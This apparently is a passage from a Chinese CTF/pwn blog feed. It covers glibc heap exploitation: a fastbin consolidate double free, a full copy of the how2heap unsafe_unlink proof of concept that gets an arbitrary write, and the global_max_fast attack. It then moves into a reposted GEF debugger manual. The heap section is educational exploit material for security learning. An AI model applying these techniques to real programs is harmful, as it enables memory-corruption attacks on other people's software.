此时第二次申请不超过0x18大小的堆（64位系统，跟申请堆时字节对齐有关，返回的堆的大小会被转换成满足条件的最小2*size_se的倍数， 最大0x10+8， 8字节可占用下一个堆的prev_size）即可返回站地址的伪造处</p><p>fastbin采用LIFO（后进先出，即后释放的插入链表头）特点 ，先申请，后释放，在申请就可以得到原来地址的块</p><h3 id="fastbin-dup-consolidate-合并"><a href="#fastbin-dup-consolidate-合并" class="headerlink" title="fastbin_dup_consolidate(合并)"></a>fastbin_dup_consolidate(合并)</h3><p> fastbin attack构成doublefree的一个示例。原理是利用申请一次largebin大小的堆会将fastbin的堆进行合并进入unsortedbin的处理流程，此时再次free fastbin中的堆会绕过free时对fastbin链表头节点的检查进而构成一次doublefree。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">//avoid consolidat3e to top chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1); now the fastbn:p1</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//alloc a large chunk</span></span><br><span class="line"><span class="comment">//cause now the fastbin is empty</span></span><br><span class="line"><span class="comment">//this alloc triggers fastbin consolidate</span></span><br><span class="line"><span class="comment">//get the fastbin chunks to the unsorted bin</span></span><br><span class="line"><span class="comment">//which pass the freee's fastbin check</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);  <span class="comment">//p1 is not in fastbin, this free doesn't cause error</span></span><br></pre></td></tr></table></figure><p> 从下图free的流程中我们可以看出free时只会检查释放fastbin大小的堆时被释放的堆是否和fastbin的头结点是否一致，而在申请0x400的largechunk时，fastbin链表非空，fastbin中的堆会进行合并并且进入unsortedbin的处理流程，在unsortedbin的处理流程中符合fastbin大小的堆会被放入smallbin，这样就绕过了free时对fastbin头结点的检查，从而可以构成一次对fastbin大小的堆的doublefree。</p><p><img src="/images/Heap/t01c19c09cfc9bafae6.png" alt="img"></p><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="noopener">github</a></p><p> 堆可以溢出到下一个堆的size域且存在一个指向堆的指针时堆溢出的一种利用方式。</p><p>利用unlink将已经构造好的chunk释放掉达到任意地址写的目的。</p><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd-&gt;prev_size)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x)."</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We just need to set the *(chunk0_ptr + x) = x, so we can pass the check"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n"</span>, chunk0_ptr[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们有个全部变量<code>chunk0_ptr</code>来保存malloc的地址，然后紧接着局部变量<code>chunk1_ptr</code>保存下一次malloc的地址。假设<code>chunk0</code>可以溢出，我们为了利用<code>free</code>函数时<code>unlink</code>操作，需要在<code>chunk0</code>的数据部分构造fake chunk（包括size,fd,bk），接着绕过<code>unlink</code>的防御机制，然后覆盖<code>chunk1</code>的堆头来满足释放<code>chunk1</code>时发生<code>consolidate backward</code>，unlink<code>chuck0</code>。 这样翻译过来就是<code>chunk0_ptr=(uint64_t *)(&amp;chunk0_ptr-3)</code>，意味着<code>chunk0_ptr</code>指向了<code>chunk0_ptr[-3]</code>。之后给<code>chunk0_ptr[3]</code>赋任意可写地址，<code>chunk0_ptr</code>就可以修改该地址的内容，达到任意地址写。</p><p>关键点是绕过<code>unlink</code>的两个约束。 <code>malloc.c</code>的源码可参考<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html。" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted size vs. prev_size"</span>, P, AV);  \</span><br><span class="line">FD = P-&gt;fd;                                                                      \</span><br><span class="line">BK = P-&gt;bk;                                                                      \</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"><span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">    FD-&gt;bk = BK;                                                              \</span><br><span class="line">    BK-&gt;fd = FD;                                                              \</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">            || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">          malloc_printerr (check_action,                                      \</span><br><span class="line">                           <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                           P, AV);                                              \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">            <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">              FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">            <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">              &#125;                                                              \</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                      \</span><br><span class="line">  &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了通过<code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code>判断，（当然<code>P = chunk0_ptr</code>）根据偏移量计算即可轻松满足。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = &amp;P - <span class="number">3</span></span><br><span class="line">BK = &amp;P - <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/images/Heap/unsafe_unlink.jpg" alt="整体结构图"></p><h2 id="一些奇奇怪怪的攻击"><a href="#一些奇奇怪怪的攻击" class="headerlink" title="一些奇奇怪怪的攻击"></a>一些奇奇怪怪的攻击</h2><h3 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global max fast"></a>global max fast</h3><p><a href="https://xz.aliyun.com/t/5082" target="_blank" rel="noopener">参考</a></p><p>global_max_fast 这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会认为是fastbin，使用fastbin的相应机制进行管理</p><p><strong>定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \ <span class="comment">//设置其默认值，默认值是0x80</span></span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)                           \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure><p>fastbin的单链表管理是比较简单的，与<code>global_max_fast</code>相关且需要注意的代码则是fastbin 所对应的index获取以及index所对应的指针获取的代码，即<code>fastbin_index</code>宏以及<code>fastbin</code>宏，对应代码如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">fastbin_index</span>(sz) \</span><br><span class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">fastbin</span>(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br></pre></td></tr></table></figure><p>可以看到这两个宏仅仅是利用偏移来定位数组的指针，但是arena所对应的<code>malloc_state</code>中fastbins数组相关的定义为：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mfastbinptr</span> <span class="selector-tag">fastbinsY</span><span class="selector-attr">[NFASTBINS]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#define</span> <span class="selector-tag">NFASTBINS</span>  (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>到这里问题就比较明显了，如果可以改写<code>global_max_fast</code>为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的<code>任意地址</code>写入所堆块的地址。</p><p>即利用<code>global_max_fast</code>进行相关的攻击</p><h3 id="tow-chunk"><a href="#tow-chunk" class="headerlink" title="tow chunk"></a>tow chunk</h3><h3 id="small-bin-attack-2-30"><a href="#small-bin-attack-2-30" class="headerlink" title="small bin attack(2.30)"></a>small bin attack(2.30)</h3><h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p><a href="https://www.anquanke.com/post/id/202387" target="_blank" rel="noopener">参考</a></p><h2 id="附送-：-最后的pwndbg调式demo（堆类）"><a href="#附送-：-最后的pwndbg调式demo（堆类）" class="headerlink" title="附送 ： 最后的pwndbg调式demo（堆类）"></a>附送 ： 最后的pwndbg调式demo（堆类）</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gef</title>
      <link href="pwn/gef/gef/"/>
      <url>pwn/gef/gef/</url>
      
        <content type="html"><![CDATA[<h1 id="gef使用"><a href="#gef使用" class="headerlink" title="gef使用"></a>gef使用</h1><p>转载自<a href="[https://www.lhyerror404.cn/2019/05/29/gef-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C](https://www.lhyerror404.cn/2019/05/29/gef-使用手册)">Saoohire’s Blog</a></p><p>本人比较懒，作者记载的又比较好，所以直接拿来用。 附上版权声明</p><a id="more"></a><h2 id="aliases-命令"><a href="#aliases-命令" class="headerlink" title="aliases 命令"></a>aliases 命令</h2><p>列举出所有的简写命令(别名)</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aliases</span><br><span class="line">[+] Aliases defined:</span><br><span class="line">fmtstr-helper                   →  <span class="keyword">format</span>-string-helper</span><br><span class="line">telescope                       →  dereference</span><br><span class="line">dps                             →  dereference</span><br><span class="line">dq                              →  <span class="keyword">hexdump</span> qword</span><br><span class="line">dd                              →  <span class="keyword">hexdump</span> dword</span><br><span class="line">dw                              →  <span class="keyword">hexdump</span> word</span><br><span class="line">dc                              →  <span class="keyword">hexdump</span> byte</span><br><span class="line"><span class="keyword">cs</span>-<span class="keyword">dis</span>                          →  capstone-disassemble</span><br><span class="line">ctx                             →  context</span><br><span class="line">start-<span class="keyword">break</span>                     →  entry-<span class="keyword">break</span></span><br><span class="line">ps                              →  process-<span class="keyword">search</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="创建-删除-简写命令-别名"><a href="#创建-删除-简写命令-别名" class="headerlink" title="创建/删除 简写命令(别名)"></a>创建/删除 简写命令(别名)</h3><p>GEF定义了自己的别名机制，该机制覆盖了GDB提供的传统别名。</p><p>用户可以通过编辑位于<code>~/.gef.rc</code>的GEF配置文件来创建/修改/删除别名。</p><p>别名必须位于配置文件的“aliases”部分中。</p><p>创建新别名就像在本节中创建新条目一样简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nano ~/.gef.rc</span><br><span class="line">[...]</span><br><span class="line">[aliases]</span><br><span class="line">my-new-alias = gdb-or-gef-command &lt;arg1&gt; &lt;arg2&gt; &lt;etc...&gt;</span><br></pre></td></tr></table></figure><h3 id="加入-PEDA-或-WinDBG的喜好设定"><a href="#加入-PEDA-或-WinDBG的喜好设定" class="headerlink" title="加入 PEDA 或 WinDBG的喜好设定"></a>加入 PEDA 或 WinDBG的喜好设定</h3><p>例如对于那些使用WinDBG并喜欢其命令的人（比如我），可以通过GEF别名将它们集成到GDB中，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nano ~/.gef.rc</span><br><span class="line">[...]</span><br><span class="line">[aliases]</span><br><span class="line"><span class="comment"># some windbg aliases</span></span><br><span class="line">dps = dereference</span><br><span class="line">dq = hexdump qword</span><br><span class="line">dd = hexdump dword</span><br><span class="line">dw = hexdump word</span><br><span class="line">dc = hexdump byte</span><br><span class="line">dt = pcustom</span><br><span class="line">bl = info breakpoints</span><br><span class="line">bp = <span class="built_in">break</span></span><br><span class="line">be = <span class="built_in">enable</span> breakpoints</span><br><span class="line">bd = <span class="built_in">disable</span> breakpoints</span><br><span class="line">bc = delete breakpoints</span><br><span class="line">tbp = tbreak</span><br><span class="line">tba = thbreak</span><br><span class="line">pa = advance</span><br><span class="line">ptc = finish</span><br><span class="line">t = stepi</span><br><span class="line">p = nexti</span><br><span class="line">g = gef run</span><br><span class="line">uf = disassemble</span><br></pre></td></tr></table></figure><p>注意：Gef本身就已经支持了这里面的许多别名 (例如<code>eb</code>命令)。</p><p>这里有一些PEDA别名用于过去使用PEDA的人。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># some peda aliases</span></span><br><span class="line">telescope = dereference</span><br><span class="line">start = entry-break</span><br><span class="line">stack = dereference <span class="variable">$sp</span> 10</span><br><span class="line">argv = show args</span><br><span class="line">kp = info stack</span><br><span class="line">findmem = search-pattern</span><br></pre></td></tr></table></figure><p>下次加载GDB（和GEF）时将加载这些新增的别名。 或者您可以使用以下命令强制GEF重新加载设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef restore</span><br></pre></td></tr></table></figure><h2 id="aslr-命令"><a href="#aslr-命令" class="headerlink" title="aslr 命令"></a>aslr 命令</h2><p>轻松的在被调试的二进制文件上检查，启用或禁用ASLR。</p><p>检查ASLR启用状态:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aslr</span><br><span class="line">ASLR <span class="keyword">is</span> currently disabled</span><br></pre></td></tr></table></figure><p>启用ASLR:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aslr <span class="keyword">on</span></span><br><span class="line">[+] Enabling ASLR</span><br><span class="line">gef➤  aslr</span><br><span class="line">ASLR <span class="keyword">is</span> currently enabled</span><br></pre></td></tr></table></figure><p>禁用ASLR:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gef</span>➤  aslr <span class="literal">off</span></span><br><span class="line">[+] Disabling ASLR</span><br></pre></td></tr></table></figure><p><strong>注意</strong>: 此命令不能影响已加载的进程，以后GDB将附加到该进程。 禁用随机化的唯一方法是设置内核设置<code>/proc/sys/kernel/randomize_va_space</code> 为0。</p><h2 id="assemble-命令"><a href="#assemble-命令" class="headerlink" title="assemble 命令"></a>assemble 命令</h2><p>如果您已经安装了keystone，那么gef将提供一个方便的命令来将本机指令直接组装到您当前正在调试的体系结构的操作码上。</p><p>通过 <code>assemble</code> 或它的别名来调用该命令 <code>asm</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ asm [INSTRUCTION [; INSTRUCTION ...]]</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/DH1b1t0vx5Nw.png" alt="mark"></p><p>使用<code>-l LOCATION</code>选项，<code>gef</code>会将<code>keystone</code>生成的汇编代码直接写入指定的内存位置。 这使得简单地覆盖操作码非常方便。</p><p><img src="../../../../../../program/writing/images/gef/ygmPdwO0SpPI.png" alt="mark"></p><h2 id="canary-命令"><a href="#canary-命令" class="headerlink" title="canary 命令"></a>canary 命令</h2><p>如果使用Smash Stack Protector（SSP）编译当前调试的进程即<code>-fstack-protector</code>标志已传递给编译器，则此命令将显示该<code>canary</code>的值。 这样可以方便地避免在内存中手动搜索此值。</p><p>命令<code>canary</code>不接受任何参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ 